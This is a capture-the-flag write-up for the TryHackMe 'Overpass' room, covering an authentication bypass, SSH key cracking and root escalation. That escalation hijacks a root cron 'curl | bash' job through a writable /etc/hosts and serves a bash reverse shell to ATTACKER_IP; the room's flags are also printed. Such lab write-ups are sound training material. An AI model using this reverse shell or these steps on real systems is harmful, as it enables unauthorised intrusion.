# Overpass — TryHackMe Writeup

**Target:** Overpass  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Enumeration, Authentication Bypass, SSH, Privilege Escalation

---

## Recon

As usual, I started with Rustscan to perform port scanning.

```bash
rustscan -b 500 -a TARGET_IP
```

![port](images/port.png)

The scan showed a web service running on port 80.

---

## Web Enumeration

I accessed the website running on port 80.

![webpage](images/webpage.png)

The website is a password manager. I then downloaded the source code to understand how the application works.

In the source code, I found the following encryption function:

```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
	var result []string
	for i := range input[:len(input)] {
		j := int(input[i])
		if (j >= 33) && (j <= 126) {
			result = append(result, string(rune(33+((j+14)%94))))
		} else {
			result = append(result, string(input[i]))
		}
	}
	return strings.Join(result, "")
}
```

Although the function is named `rot47`, the implementation uses `+14`, meaning printable ASCII characters are actually shifted by 14 positions.

---

## Directory Enumeration

I performed directory enumeration using Gobuster with the `.js` extension.

```bash
gobuster dir -u http://TARGET_IP/ -w ~/wordlists/common.txt -x js
```

![gobuster](images/gobuster.png)

After checking the discovered endpoints, I did not find any credentials directly.

The room hint says:

> OWASP Top 10 vuln, do not bruteforce.

I then went back to the source code, especially `login.js`.

---

## Authentication Bypass

From `login.js`, the login flow sends a request to:

```text
POST /api/login
```

The response is then used as the `SessionToken`.

The interesting part is:

```javascript
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value=""
} else {
    Cookies.set("SessionToken",statusOrCookie)
    window.location = "/admin"
}
```

The frontend only considers the login unsuccessful if the response is exactly:

```text
Incorrect credentials
```

Any other response is treated as a valid `SessionToken`, and the browser is redirected to `/admin`.

This means the authentication logic is vulnerable because the frontend does not properly validate the authentication state.

I then intercepted the response and used match and replace to change the `Incorrect credentials` response.

![bypass](images/bypass.png)

The login was successfully bypassed, giving me access to `/admin`.

From the admin page, I obtained an encrypted SSH private key.

---

## SSH Private Key

I converted the private key into a John-compatible hash using `ssh2john`:

```bash
ssh2john id_rsa > hash.txt
```

Then I cracked the hash using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The password was successfully recovered.

I then used the private key to log in as `james` over SSH.

![ssh](images/ssh.png)

---

## User Enumeration

After getting a shell as `james`, I enumerated his home directory.

There was a `todo.txt` file:

```text
To Do:
> Update Overpass' Encryption, Muirland has been complaining about it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

There was also a `.overpass` file containing:

```text
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN
```

Using the encryption algorithm found earlier, I decoded the string into:

```json
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

---

## Privilege Escalation

Next, I checked `/etc/crontab`.

I found a custom cronjob:

```text
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The cronjob runs every minute as `root`.

The interesting part is the hostname `overpass.thm`, which is used to download:

```text
/downloads/src/buildscript.sh
```

I then checked the permissions of `/etc/hosts`:

```text
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

Since `/etc/hosts` is writable, I could redirect `overpass.thm` to my attacker machine.

I changed the entry in `/etc/hosts` to:

```text
ATTACKER_IP overpass.thm
```

On my attacker machine, I created the following file structure:

```text
downloads/src/buildscript.sh
```

The contents of `buildscript.sh` were:

```bash
#!/bin/bash

bash -i >& /dev/tcp/ATTACKER_IP/9004 0>&1
```

I then started an HTTP server from the directory containing the `downloads` folder:

```bash
python3 -m http.server 80
```

And started a listener:

```bash
nc -lvnp 9004
```

Because the cronjob runs every minute as root, the target requests the malicious `buildscript.sh` from my machine and executes it with `bash`.

After waiting for the cronjob to run, I received a reverse shell and obtained a root shell.

![root](images/root.png)

---

## Flags

**User flag:**

```text
thm{65c1aaf000506e56996822c6281e6bf7}
```

**Root flag:**

```text
thm{7f336f8c359dbac18d54fdd64ea753bb}
```
